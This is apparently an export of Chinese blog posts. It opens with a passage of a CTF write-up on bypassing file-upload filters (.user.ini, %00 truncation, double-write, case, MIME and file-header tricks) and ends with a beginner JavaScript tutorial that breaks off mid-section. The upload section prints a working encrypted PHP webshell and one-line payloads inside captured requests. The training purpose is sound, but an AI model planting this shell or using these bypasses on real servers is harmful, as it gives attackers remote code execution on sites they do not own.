auto_prepend_file = &lt;filename&gt;         //将指定文件包含在该目录中所有php脚本的文件头部auto_append_file = &lt;filename&gt;          //将指定文件包含在该目录中所有php脚本的文件尾部

.user.ini使用前提
能成功上传.user.ini文件的上传，且没有被重命名
此目录下已有一个任意的.php文件

.user.ini作用范围与.htaccess文件相同，.user.ini的生效范围为.user.ini文件所在的当前目录。
.user.ini使用方法1.首先上传一个含有php代码的任意符合后端检测的文件，以.jpg为例：
文件名为info.jpg,内容为
&lt;?php phpinfo();?&gt;

2.载上传入.user.ini文件，内容为：
auto_prepend_file = info.jpg   

注：info.jpg需要自己上传问文件名来确定
3.访问文件上传目录下的任意.php文件即可
例题：数字后缀绕过数字后缀简介PHP 文件的标准后缀始终是 .php，适用于所有版本的 PHP。然而，在某些特定场景或由某些开发者&#x2F;系统中，使用.php3 、.php5 、.php7 等不是 PHP 语言的标准文件后缀,由于一些特殊的设置.php7 等后缀可被PHP解释器解析
使用条件：Apache 的配置文件或目录下的.htaccess 文件有添加设置，如.php7可被解析的配置为：
AddHandler application/x-httpd-php .php7





利用中间件漏洞
中间件漏洞是指在计算机系统中使用的中间件软件中存在的安全漏洞。中间件是指位于操作系统和应用程序之间的软件组件，用于提供不同应用程序之间的通信和交互。常见的中间件包括数据库管理系统、Web服务器(如：Apache、Nginx)等。


    引用站外地址
    
        
          
        
        
            中间件漏洞
             点击查看中间件漏洞文章
        
        
    
    





后端绕过-软件漏洞
利用PHP某些版本的BUG可以做到一些意想不到的效果。例如，00截断

PHP 00截断绕过
    引用站外地址
    
        
          
        
        
            Diffany
             感谢Diffany师傅提供的指导
        
        
    
    

00截断利用条件
php版本要小于5.3.4，5.3.4及以上已经修复该问题
PHP的magic_quotes_gpc为OFF状态
用户可指定上传路径

00绕过简介ASCII中0作为特殊字符保留，表示字符串结束。
当用户传递文件上传路径包含00，无论00后存在任何内容文本(或后端直接对00字符串进行拼接其他字符串)，00后的内容都会被截断，最后字符串留下00前的内容且不包括00。
以GET方式举例：
ASCII中的00，无法直接显示，所以使用URL编码，ASCII中00经过url编码后变为%00
页面源码为：
&lt;?php    include $_GET[&#x27;file&#x27;];?&gt;

test.txt的内容为
&lt;?php    echo &#x27;SUCCESS&#x27;;?&gt;

test.txt%00.2.txt的内容为
&lt;?php    echo &#x27;False&#x27;;?&gt;

实验1
此时通过GET传递参数，?file=test.txt%00.2.txt
 查看图片教程 
              
              
              
            

页面出现SUCCESS，说明include的文件是test.txt，此时file被解析为test.txt
实验2：改变页面源码
&lt;?php	$file = $_GET[&#x27;file&#x27;] . &#x27;.2.txt&#x27;;    include $_GET[&#x27;file&#x27;];?&gt;

此时通过GET传递参数，?file=test.txt%00
 查看图片教程 
              
              
              
            

页面还是出现SUCCESS，说明include的文件是test.txt，而不是test.txt.2.txt，此时变量file受$_GET[&#39;file&#39;]中的影响，一同被截断
00绕过方法GET传参保存路径后端对文件路径的处理类似为
$des = $_GET[&#x27;road&#x27;] . &quot;/对文件名的处理操作......&quot; . $ext;

此时road为我们可控的参数，可直接进行使用%00截断
 查看图片教程 
              
              
              
            

由于使用00截断，所以最后文件保存在/var/www/html/upload,名为shell.php,根据位置，访问/upload/shell.php,即进入我们所在的页面，使用蚁剑连上后，可以找到我们成功截断的shell.php
 查看图片教程 
              
              
              
            

POST传参保存路径与GET传参类似的的是：后端对文件路径的处理类似为
$des = $_POST[&#x27;road&#x27;] . &quot;/对文件名的处理操作......&quot; . $ext;

此时road为我们可控的参数，但与GET传参不同的是，http请求内包含文件时，POST参数不再被自动解码，所以POST传参需要使用BP使用查看16进制的请求详情，修改一个十六进制的为00
 查看图片教程 
              
              
              
            

步骤一：修改路径添加文件名，写入需要执行的代码语句
 查看图片教程 
              
              
              
            

步骤一：切换为十六进制模式，修改所需要替换为00的位置
 查看图片教程 
              
              
              
            

由于使用00截断，所以最后文件保存在/var/www/html/upload,名为test.php,根据位置，访问/upload/test.php,即进入我们所在的页面，可以看到PHP的配置信息，00截断成功
 查看图片教程 
              
              
              
            

例题：CTFHUB-技能树-WEB-文件上传-00截断
查看页面源代码发现后端的源码
if (!empty($_POST[&#x27;submit&#x27;])) &#123;    $name = basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);    $info = pathinfo($name);    $ext = $info[&#x27;extension&#x27;];    $whitelist = array(&quot;jpg&quot;, &quot;png&quot;, &quot;gif&quot;);    if (in_array($ext, $whitelist)) &#123;        $des = $_GET[&#x27;road&#x27;] . &quot;/&quot; . rand(10, 99) . date(&quot;YmdHis&quot;) . &quot;.&quot; . $ext;        if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $des)) &#123;            echo &quot;&lt;script&gt;alert(&#x27;上传成功&#x27;)&lt;/script&gt;&quot;;        &#125; else &#123;            echo &quot;&lt;script&gt;alert(&#x27;上传失败&#x27;)&lt;/script&gt;&quot;;        &#125;    &#125; else &#123;        echo &quot;文件类型不匹配&quot;;    &#125;&#125;

抓包，修改GET参数为?road=/var/www/html/upload/shell.php%00，使用00截断，在传入文件的内容替换成需要执行的代码，如一句话等
 查看图片教程 
              
              
              
            

然后使用蚁剑连接进入，可以看到我们是成功使用00截断写入的shell.php
 查看图片教程 
              
              
              
            





后端检测-修改绕过
通过抓包我们发送的请求，修改请求包中的部分内容，如修改文件名(黑名单双写，大小写替换)，MIME，添加文件头等等操作，使之上传的木马符合后端的要求，使之成功上传。

双写绕过双写绕过原理有时候在检测时，后台会把敏感字符删除，这个时候，可以使用双写进行绕过。比如：将.php改写为.pphphp
后端的代码类似为：
$name = basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);$blacklist = array(&quot;php&quot;, &quot;php5&quot;, &quot;php4&quot;, &quot;php3&quot;, &quot;phtml&quot;, &quot;pht&quot;, &quot;jsp&quot;, &quot;jspa&quot;, &quot;jspx&quot;, &quot;jsw&quot;, &quot;jsv&quot;, &quot;jspf&quot;, &quot;jtml&quot;, &quot;asp&quot;, &quot;aspx&quot;, &quot;asa&quot;, &quot;asax&quot;, &quot;ascx&quot;, &quot;ashx&quot;, &quot;asmx&quot;, &quot;cer&quot;, &quot;swf&quot;, &quot;htaccess&quot;, &quot;ini&quot;);$name = str_ireplace($blacklist, &quot;&quot;, $name); //str_ireplace() 函数替换字符串中的一些字符（不区分大小写）

例题：CTFHUB-技能树-WEB-文件上传-双写后缀
查看页面源码，发现这样一段内容
&lt;!--$name = basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);$blacklist = array(&quot;php&quot;, &quot;php5&quot;, &quot;php4&quot;, &quot;php3&quot;, &quot;phtml&quot;, &quot;pht&quot;, &quot;jsp&quot;, &quot;jspa&quot;, &quot;jspx&quot;, &quot;jsw&quot;, &quot;jsv&quot;, &quot;jspf&quot;, &quot;jtml&quot;, &quot;asp&quot;, &quot;aspx&quot;, &quot;asa&quot;, &quot;asax&quot;, &quot;ascx&quot;, &quot;ashx&quot;, &quot;asmx&quot;, &quot;cer&quot;, &quot;swf&quot;, &quot;htaccess&quot;, &quot;ini&quot;);$name = str_ireplace($blacklist, &quot;&quot;, $name);--&gt;

这时候上传shell文件，并抓包，将后缀名.php改写为.pphphp，再发包最后成功上传
大小写后缀绕过大小写后缀绕过后端在检测时，后台会检测敏感字符，如果并没有不区分大小写时，可以使用大小写进行绕过。比如：将.php改写为.pHp
后端的代码类似为：
$name = basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);$blacklist = array(&quot;php&quot;, &quot;php5&quot;, &quot;php4&quot;, &quot;php3&quot;, &quot;phtml&quot;, &quot;pht&quot;, &quot;jsp&quot;, &quot;jspa&quot;, &quot;jspx&quot;, &quot;jsw&quot;, &quot;jsv&quot;, &quot;jspf&quot;, &quot;jtml&quot;, &quot;asp&quot;, &quot;aspx&quot;, &quot;asa&quot;, &quot;asax&quot;, &quot;ascx&quot;, &quot;ashx&quot;, &quot;asmx&quot;, &quot;cer&quot;, &quot;swf&quot;, &quot;htaccess&quot;, &quot;ini&quot;);$pattern = &#x27;/\b(&#x27; . implode(&#x27;|&#x27;, $blacklist) . &#x27;)\b/&#x27;; //区分大小写if (preg_match($pattern, $name)) &#123;    echo &#x27;hack&#x27;;    exit();&#125; 

MIME检测绕过MIME简介MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的标准，用来表示文档、文件或字节流的性质和格式。浏览器通常使用 MIME 类型（而不是文件扩展名）来确定如何处理URL。部分Web应用系统判定文件类型是通过content-type字段，截取一个请求信息：
POST / HTTP/1.1Content-Length: 930Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydBnKdxUvNtC4xakzUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://challenge-bb136257750ed7ee.sandbox.ctfhub.com:10800/Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Connection: close------WebKitFormBoundarydBnKdxUvNtC4xakzContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;echo.php&quot;Content-Type: application/octet-stream&lt;?phpecho &#x27;wells&#x27;;?&gt;------WebKitFormBoundarydBnKdxUvNtC4xakzContent-Disposition: form-data; name=&quot;submit&quot;Submit------WebKitFormBoundarydBnKdxUvNtC4xakz--

其中Content-Type: application/octet-stream和就是描述了上传文件的MIME 类型
MIME绕过方法部分Web应用系统判定文件类型是通过content-type字段，因此可以通过抓包，将content-type字段改为常见的图片类型，如image/gif，从而绕过校验。
常见的MIME类型:text/plain （纯文本）  text/html （HTML文档）  text/javascript （js代码）  application/xhtml+xml （XHTML文档）  image/gif （GIF图像）  image/jpeg （JPEG图像）  image/png （PNG图像）  video/mpeg （MPEG动画）  application/octet-stream （二进制数据）  application/pdf （PDF文档）
例题：CTFHUB-技能树-WEB-文件上传-MIME绕过
尝试直接上传.htaccess和phpshell文件时都上传失败，尝试修改MIME类型，抓包原始请求头
POST / HTTP/1.1Content-Length: 930Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydBnKdxUvNtC4xakzUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://challenge-bb136257750ed7ee.sandbox.ctfhub.com:10800/Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Connection: close------WebKitFormBoundarydBnKdxUvNtC4xakzContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.php&quot;Content-Type: application/octet-stream&lt;?php@error_reporting(0);session_start();    $key=&quot;7dad18e6e49e447a&quot;;	$_SESSION[&#x27;k&#x27;]=$key;	session_write_close();	$post=file_get_contents(&quot;php://input&quot;);	if(!extension_loaded(&#x27;openssl&#x27;))	&#123;		$t=&quot;base64_&quot;.&quot;decode&quot;;		$post=$t($post.&quot;&quot;);				for($i=0;$i&lt;strlen($post);$i++) &#123;    			 $post[$i] = $post[$i]^$key[$i+1&amp;15];     			&#125;	&#125;	else	&#123;		$post=openssl_decrypt($post, &quot;AES128&quot;, $key);	&#125;    $arr=explode(&#x27;|&#x27;,$post);    $func=$arr[0];    $params=$arr[1];	class C&#123;public function __invoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125;    @call_user_func(new C(),$params);?&gt;------WebKitFormBoundarydBnKdxUvNtC4xakzContent-Disposition: form-data; name=&quot;submit&quot;Submit------WebKitFormBoundarydBnKdxUvNtC4xakz--

将
------WebKitFormBoundary4BffHh31AMlHQtBdContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.php&quot;Content-Type: application/octet-stream

修改为
------WebKitFormBoundary4BffHh31AMlHQtBdContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.php&quot;Content-Type: image/gif

再放行，最后发现shell.php被成功上传，访问upload/shell.php，无内容显示，说明.txt文件被作为php脚本执行成功，使用冰蝎连接
 查看图片教程 
              
              
              
            

成功获取phpinfo页面，连接成功，读取flag
文件头检测绕过文件头检测绕过简介文件头是在每一个文件（包括图片，视频或其他的非ASCII文件）的开头（十六进制表示）的一段数据，用于描述文件的属性和格式信息， 在进行文件头绕过时，我们可以把图片的文件头添加到我们的木马内容最前面，达到绕过文件头检测的目的。
常见的文件头注意：文本形式请点击复制，不要做任何修改
 GIF：
16进制模式：47 49 46 38 39 61
对应文本：
GIF89a

 png：
16进制模式：89 50 4E 47 0D 0A 1A 0A 
对应文本：
‰PNG

JPG：
16进制模式：FF D8 FF E0 00 10 4A 46 49 46    
对应文本：
ÿØÿà

文件头检测绕过条件
某些情况下，后端可能还会检测文件拓展名，此时需要结合解析漏洞或者文件包含才能实现执行木马

例题：CTFHUB-技能树-WEB-文件上传-文件头检查
步骤一：直接选择木马文件进行上传，然后进行抓包
 查看图片教程 
              
              
              
            

以添加PNG请求头为例
方法一：在PHP代码前添加入任意八个字母，用于定位以及替换为PNG的文件头，后转HEX模式替换为PNG的文件头
 查看图片教程 
              
              
              
            

方法二：直接在PHP代码后插入PNG文件头对应的文本表示符号
 查看图片教程 
              
              
              
            





参考文章
参考腾讯云开发者社区博主「网络安全自修室」的文章
原文链接：超详细文件上传漏洞总结分析-腾讯云开发者社区-腾讯云 (tencent.com)


]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF-Web</tag>
        <tag>Web-FileUpload</tag>
      </tags>
  </entry>
  <entry>
    <title>反序列化漏洞-入门</title>
    <url>/posts/2255213327/</url>
    <content><![CDATA[施工中
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF-Web</tag>
        <tag>Web-Unserialize</tag>
      </tags>
  </entry>
  <entry>
    <title>初探Python</title>
    <url>/posts/831263057/</url>
    <content><![CDATA[施工中
]]></content>
      <categories>
        <category>编程</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript初探索</title>
    <url>/posts/4105956505/</url>
    <content><![CDATA[JavaScript 是一种可插入 HTML 页面的轻量级的编程语言。
初识JavaScriptJavaScript的功能
直接写入 HTML 输出流
对事件的反应
改变 HTML 内容
改变 HTML 图像
改变 HTML 样式
验证输入

JavaScript 用法内部的 JavaScriptHTML 中的 Javascript 脚本代码必须位于 &lt;script&gt; 与 &lt;/script&gt;标签之间，加上标签后的代码代码可被放置在 HTML 页面的 &lt;body&gt; 和 &lt;head&gt; 部分中。
外部的 JavaScript外部 JavaScript 文件的文件扩展名是 .js。使用以下代码，可将代码引入外部的 JavaScript
&lt;script src=&quot;the_url_of_your_.js&quot;&gt;&lt;/script&gt;

​	由于混合 JavaScript 和 HTML 会使代码难以维护和理解，所以与CSS一样，将js代码文件与html文件分离
JavaScript 运行次序当浏览器执行到一段 JavaScript 代码时，通常会按从上往下的顺序执行这段代码。如果 JavaScript 先于要修改的 HTML 和 CSS 加载和运行，则可能发生错误。在引用对象之前必须确保该对象已经存在，对象还不存在，就不能为它增添一个事件监听器。
脚本调用设置异步加载：指在 HTML 文档解析过程中，同时下载其他资源的过程。
默认情况浏览器会立即下载并执行脚本。这意味着脚本会阻塞 HTML 文档的解析和渲染过程，直到脚本执行完毕。如果脚本文件很大或加载时间较长，这可能会导致页面加载速度变慢。
异步下载立即执行(限外部JS)带有 async 属性的脚本，浏览器会异步下载脚本文件，并且不会阻塞 HTML 文档的解析和渲染。一旦脚本文件下载完成，浏览器会立即执行它，而不会等待其他资源的加载完成。
async 属性的脚本将在下载完成后立即执行。这将阻塞页面，并不保证任何特定的执行顺序。
异步下载等待页面渲染后顺序执行内部的 JavaScript可以使用以下结构：
document.addEventListener(&quot;DOMContentLoaded&quot;, () =&gt; &#123;  // 在这里编写你的 JavaScript 代码&#125;);

外部的 JavaScript可以使用了defer标签：
&lt;script src=&quot;the_url_of_your_.js&quot; defer&gt;&lt;/script&gt;

带有 defer 属性的脚本将按照它们的顺序加载，并且只有在所有脚本加载完毕后才会执行。
总结：
如果脚本无需依赖html解析渲染出的对象，且无依赖其他资源独立运行，那么应使用 async。
如果脚本需要依赖html解析渲染出的对象，或依赖于其他脚本，调用这些脚本时应使用 defer，将关联的脚本按所需顺序置于 HTML 的相应 &lt;script&gt; 元素中。

一些我奇怪的想法

如果脚本需要依赖html解析渲染出的对象，但不依赖于其他脚本，使用defer属性
如果脚本无需要依赖html解析渲染出的对象，且依赖于其他脚本，使用defer属性或者将两个js写在一块，用async属性

总之一般情况下都用defer，比较万金油，默认模式一般都不推荐使用
基础概念函数（Function）函数是可复用的代码块，可以一次编写，反复运行，从而节省了大量的重复代码。
函数的格式包括了关键字 function 、一个函数名、一对小括号定义了一个函数。随后是一对花括号（&#123; &#125;）。花括号内部是调用函数时要运行的所有代码。
function the_name_of_function() &#123;  your code;&#125;



事件（Event）理想中，我们希望在点击某个按钮时调用某个函数，为此，我们需要使用事件。事件就是浏览器中发生的事儿，比如点击按钮、加载页面、播放视频，等等，我们可以通过调用代码来响应事件。侦听事件发生的结构称为事件监听器（Event Listener），响应事件触发而运行的代码块被称为事件处理器（Event Handler）。
对象（Object）在JavaScript中，一切都是对象。对象是一种复合数据类型(类似C语言的结构体)，它可以包含属性和方法，由逗号分隔开。例如：
// 定义一个对象const person = &#123;  // 属性  name: &quot;John&quot;,  age: 30,  // 方法  greet: function() &#123;    console.log(&quot;Hello, my name is &quot; + this.name);  &#125;&#125;;

点符号（.）来访问对象的属性和其他方法，例如：
person.greet(); // 调用对象的方法

属性是对象的特征或数据是任何JavaScript数据类型，包括字符串、数字、布尔值、数组、甚至其他对象。
方法（method）与对象关联的函数。方法是在对象上定义的，它可以访问对象的属性和其他方法，并执行特定的操作。是对象能够执行的操作或行为。可通过浏览器的JavaScript 控制台操作浏览器对象
函数与方法的差别
归属关系：方法是与对象关联的函数。它们通常是在对象的上下文中定义的，并且可以访问对象的属性和其他方法。方法是对象的行为或操作。函数是独立的代码块，不依赖于特定的对象。它们可以在任何地方定义和调用，而不需要依赖于对象。

调用方式：方法通过对象来调用。它们使用对象名和方法名的结合形式进行调用，例如 objectName.methodName()。方法的调用是基于对象的，因此方法可以使用对象的属性和其他方法。函数可以直接通过函数名进行调用，例如 functionName()。函数的调用是独立的，不依赖于特定的对象。

参数传递：方法通常将对象本身作为第一个参数传递给方法（通常称为 this 或 self），以便在方法内部访问对象的属性和其他方法。方法可以接受其他参数作为输入。函数可以接受任意数量的参数，并且可以通过参数来接收外部值。
例：
const person = &#123;  name: &quot;Wells&quot;,  greet: function() &#123;    console.log(&quot;Hello, my name is &quot; + this.name); //使用this作为对象本身  &#125;,&#125;;person.greet(); // 输出 &quot;Hello, my name is Wells&quot;



定义方式：方法是在对象或类的定义中声明的。它们可以使用对象字面量语法或类的方法定义语法进行定义。函数可以在全局范围内或其他函数内部进行定义。它们可以使用函数声明语法或函数表达式语法进行定义。


运算符（Operator）JavaScript 运算符允许我们执行比较、做数学运算、连接字符串等等。
算术运算符


运算符
描述



+
加法


-
减法


*
乘法


**
幂


&#x2F;
除法


%
取模（余数）


++
自增


–
自减



自增和自减运算符放置在变量前和变量后与区别（与C语言类似）

前置自增&#x2F;自减运算符会先对变量进行自增或自减操作，然后返回更新后的值。
后置自增&#x2F;自减运算符会先返回变量的原始值，然后再对变量进行自增或自减操作。


运算符用于把文本值或字符串变量加起来（连接起来）。
例如：
txt1=&quot;What a very&quot;;txt2=&quot;nice day&quot;;txt3=txt1+txt2;

则txt3为What a verynice day

如果数字与字符串相加，此时数字会被认为是字符串，返回字符串
例如
z=&quot;Hello&quot;+666;

则z为Hello666


赋值运算符赋值运算符用于给 JavaScript 变量赋值。



运算符
例子
等同于



&#x3D;
x&#x3D;y
（将y赋值给x）


+&#x3D;
x+&#x3D;y
x&#x3D;x+y


-&#x3D;
x-&#x3D;y
x&#x3D;x-y


*&#x3D;
x*&#x3D;y
x&#x3D;x*y


&#x2F;&#x3D;
x&#x2F;&#x3D;y
x&#x3D;x&#x2F;y


%&#x3D;
x%&#x3D;y
x&#x3D;x%y


比较运算符比较运算符在逻辑语句中使用，以测定变量或值是否相等。
以x&#x3D;5为例：



运算符
描述
比较
返回值



&#x3D;&#x3D;
等于(类型不等时会进行转化)
x&#x3D;&#x3D;8
false




x&#x3D;&#x3D;5
true




x&#x3D;&#x3D;”5”
true


&#x3D;&#x3D;&#x3D;
严格等于（值和类型均相等）
x&#x3D;&#x3D;&#x3D;”5”
false




x&#x3D;&#x3D;&#x3D;5
true


!&#x3D;
不等于
x!&#x3D;8
true




x!&#x3D;”5”
false


!&#x3D;&#x3D;
严格不等于（值和类型有一个不相等，或两个都不相等）
x!&#x3D;&#x3D;”5”
true




x!&#x3D;&#x3D;5
false


&gt;
大于
x&gt;8
false


&lt;
小于
x&lt;8
true


&gt;&#x3D;
大于或等于
x&gt;&#x3D;8
false


&lt;&#x3D;
小于或等于
x&lt;&#x3D;8
true


严格的版本往往导致更少的错误，建议使用这些严格的版本。
逻辑运算符逻辑运算符用于测定变量或值之间的逻辑。



运算符
描述



&amp;&amp;
and（同时成立为真）


||
or（一个成立为真）


!
not


条件（三元）运算符条件元素运算符把两个结果中其中一个符合运算逻辑的值返回。
? :(condition ? ifTrue : ifFalse)



更多条件运算符参照：
表达式和运算符 - JavaScript | MDN (mozilla.org)
JavaScript基础JavaScript的语句都是以;作为结束，缺少;会导致报错
注释语法单行注释
在双斜杠（&#x2F;&#x2F;）后添加单行注释，比如：
// 我是一条注释

多行注释
在/*和*/之间添加多行注释，比如：
/*  我也是  一条注释*/

声明变量声明一个变量，即创建一个变量。
声明一个变量的语法是在 var 或 let 关键字之后加上这个变量的名字，例如：
var Name2;let Name1;

var 与 let 的区别推荐在现代JavaScript中使用 let 来声明变量

作用域：使用 var 声明的变量具有函数作用域，而使用 let 声明的变量具有块级作用域。函数作用域意味着变量在声明它们的函数内部是可见的，而块级作用域意味着变量在声明它们的代码块（例如，&#123;&#125;包括起来的代码块：if语句、循环等）内部是可见的。

变量提升：使用 var 声明的变量会发生变量提升，意味着变量在其作用域内的任何位置都是可访问的，即使在变量声明之前也可以访问到。而使用 let 声明的变量不会发生变量提升，它们只能在声明之后才能被访问。
例如：
myName = &quot;Chris&quot;;function logName() &#123;  console.log(myName);&#125;logName();//输出undefinedvar myName;

感谢@Eneed_gl的指错，变量提升（指的是函数声明和变量声明（注意是声明，不包括初始化）会被提升到其所在作用域的最顶部）的时候是不会编译先前初始化的赋值语句的，故此时输出undefined




console.log(name); // 输出 undefinedvar name = &quot;John&quot;;console.log(name); // 输出 &quot;John&quot;

​	以上代码它仍然可以工作，若替换成let则就会报错

重复声明：使用 var 声明的变量可以被多次声明而不会引发错误，而使用 let 声明的变量在同一作用域内重复声明会引发错误。

全局对象属性：使用 var 声明的变量会成为全局对象（在浏览器中是 window 对象）的属性，而使用 let 声明的变量不会成为全局对象的属性。


变量命名的规则使用拉丁字符 (0-9,a-z,A-Z) 和下划线字符。

你不应当使用规则之外的其他字符，因为它们可能引发错误，或对国际用户来说难以理解。
变量名不要以下划线开头——以下划线开头的被某些 JavaScript 设计为特殊的含义，因此可能让人迷惑。
变量名不要以数字开头。这种行为是不被允许的，将会报错。
变量名大小写敏感——因此myage与myAge是 2 个不同的变量。
避免使用 JavaScript 的保留字给变量命名。保留字，即是组成 JavaScript 的实际语法的单词

变量类型JavaScript 是一种“动态类型语言”，你不需要指定变量将包含什么数据类型
数字​	包括整数也包括浮点数，统称为数字，例如：
let myAge = 17;

字符串​	当你给一个变量赋值为字符串时，你需要用单引号或者双引号把值给包起来，例如：
let prise = &quot;You are smart&quot;;

布尔值​	布尔值有 2 种：true 或 false，用于进行判断
let iAmAlive = true;

数组​	数组将任何类型的元素存储在数组中 - 字符串，数字，对象，另一个变量，甚至另一个数组。也可以混合不同类型元素，方括号括起来（区别于C语言），并用逗号分隔，最开始的序号为0，例如：
let myNameArray = [&quot;Chris&quot;, &quot;Bob&quot;, &quot;Jim&quot;];let myNumberArray = [10, 15, 40];let sequence = [1, 1, 2, 3, 5, 8, 13];let random = [&quot;tree&quot;, 795, [0, 1, 2]];

其中
myNameArray[0]; // 将得到：ChrismyNumberArray[2]; // 将得到：40



对象​	见前文：基础概念·对象（Object），例如：
let dog = &#123; name: &quot;Spot&quot;, breed: &quot;Dalmatian&quot; &#125;;

与C语言调用结构体的成员类似，使用.用来表示对象中的某个信息，例如：
dog.name;



Undefined 和 NullUndefined 这个值表示变量不含有值。
可以通过将变量的值设置为 null 来清空变量。
常量概念:使用 const 声明的变量称为“常量”
当某个变量永远不会改变的时候，就可以使用 const 来声明，而不是let。
注意:

常量的命名规范和变量一致

常量不允许重新赋值,声明的时候必须赋值(初始化)

小技巧:可以利用const进行自定义函数，语法如下
const functionName = function(parameters) &#123;  // 函数体&#125;;

字符串包裹字符串在 JavaScript 中，可以选择单引号（&#39;）、双引号（&quot;）或反引号（&#96;&#96;&#96;）来包裹字符串。字符串的开头和结尾必须使用相同的符号进行包裹
使用单引号声明的字符串和使用双引号声明的字符串是相同的
使用反引号声明的字符串是一种特殊字符串，被称为模板字面量。在大多数情况下，模板字面量与普通字符串类似，但它具有一些特殊的属性：
1.字符串插值（String interpolation）：您可以在模板字符串中使用 $&#123;&#125; 语法来插入变量或表达式的值。例如：
const name = &quot;Wells&quot;;const message = `My name is $&#123;name&#125;.`;console.log(message); // 输出 &quot;My name is Wells.&quot;

但对于单引号（&#39;）、双引号（&quot;）可使用可以使用 + 运算符来连接字符串。
const greeting = &quot;你好&quot;;const name = &quot;Wells&quot;;console.log(greeting + &quot;，&quot; + name); // &quot;你好，Wells&quot;

2.多行字符串：模板字面量可以跨越多行，而无需使用特殊的转义字符或字符串连接操作符。例如：
const multiLine = `This is amulti-linestring.`;console.log(multiLine);


输出:This is amulti-linestring.

在上面的例子中，模板字面量可以直接包含换行符，而不需要使用 \n 转义字符。
3.嵌套模板字面量：您可以在模板字面量中嵌套其他模板字面量，以构建更复杂的字符串。例如：
const nestedTemplate = `Hello, $&#123;`My name is $&#123;name&#125;`&#125;.`;console.log(nestedTemplate); // 输出 &quot;Hello, My name is John.&quot;

在上面的例子中，$&#123;name&#125; 是嵌套在外部模板字面量中的。
字符串包含引号要实现字符串:
She said &quot;I think so!&quot;

此时不能再使用&quot;&quot;,一种常见的方法是换用其他字符来声明字符串：
const goodQuotes1 = &#x27;She said &quot;I think so!&quot;&#x27;;const goodQuotes2 = `She said &quot;I think so!&quot;`;

另一种选择是转义存在问题的引号。转义字符意味着我们对它们做了一些处理，以确保它们被识别为文本，而不是代码的一部分。在 JavaScript 中，我们通过在字符之前加上反斜杠(\)来实现这一点。
操作字符串把字符串当作对象，就可以有大量的原型和方法编辑它。以下为常用的属性和操作
获得字符串的长度这很简单 — 你可以很轻松的使用 length属性。尝试输入以下的两行代码：
let browserType = &quot;mozilla&quot;;browserType.length;

因为”mozilla”的长度为 7 个字符,这个结果应该返回一个数字：7。说字符串的长度有用是有很多原因的，例如，你可能想算出一连串名字的长度，并用名字长度来作为名字排序的依据，亦或让一个用户知道他输入的用户名太长，已经超出了输入的字符串长度限制。
检索特定字符串字符可以使用方括号表示法(在变量名的末尾包含方括号[ ])返回字符串中的任何字符.例如，要检索第一个字母，可以这样做：(如同数组)
browserType[0];

在字符串中查找子字符串并提取它有时候你会想要找出一个较小的字符串是否存在于一个较大的字符串中（我们通常会说一个字符串中存在一个子字符串）。这可以使用indexOf()方法来完成，该方法需要一个parameter (en-US)— 你想要搜索的子字符串。例如：
browserType.indexOf(&quot;zilla&quot;);

返回的结果是子字符串起始的位置（原字符串第一个字母为0），若无结果将返回-1
转换大小写字符串方法toLowerCase()和toUpperCase()字符串并将所有字符分别转换为小写或大写。
替换字符串的某部分使用replace()方法将字符串中的一个子字符串替换为另一个子字符串。
它需要两个参数 - 要被替换下的字符串和要被替换上的字符串。
数组获取数组长度使用 length属性获取数组的长度（数组中有多少项元素）
let sequence = [1, 1, 2, 3, 5, 8, 13];sequence.length;// 将返回7

字符串与数组转换将数组看作成对象，可使用 split() 方法将一个长长的字符串中的原始数据，分成更有用的数据，存储在数组中，例如：
let myData = &quot;Manchester,London,Liverpool,Birmingham,Leeds,Carlisle&quot;;let myArray = myData.split(&quot;,&quot;);//以，号来隔开myArray;//输出[&#x27;Manchester&#x27;, &#x27;London&#x27;, &#x27;Liverpool&#x27;, &#x27;Birmingham&#x27;, &#x27;Leeds&#x27;, &#x27;Carlisle&#x27;]

也可以使用 join()方法进行相反的操作，例如：
let myNewString = myArray.join(&quot;,&quot;);//以，进行连接myNewString;//输出 &#x27;Manchester,London,Liverpool,Birmingham,Leeds,Carlisle&#x27;

添加和删除数组项可以使用 push() 方法，在数组末尾添加项目，例如：
myArray.push(&quot;Cardiff&quot;);//增加一个myArray.push(&quot;Bradford&quot;, &quot;Brighton&quot;);//增加两个

​	当方法调用完成时，将返回值为数组的新长度。
var newLength = myArray.push(&quot;Bristol&quot;);//newLength为一个值

可以使用 pop()方法，在数组末尾删除一个项目，例如：
myArray.pop();

​	当方法调用完成时，将返回值已删除的项目。
let removedItem = myArray.pop();//removedItem为被删除的元素

除此之外，还有unshift() 和 shift() 的方法分别作用于数组的开始进行添加或者删除元素，返回值与 push() 和 pop()方法相同
条件语句if…else 语法基本的 if...else 语法看起来这样：
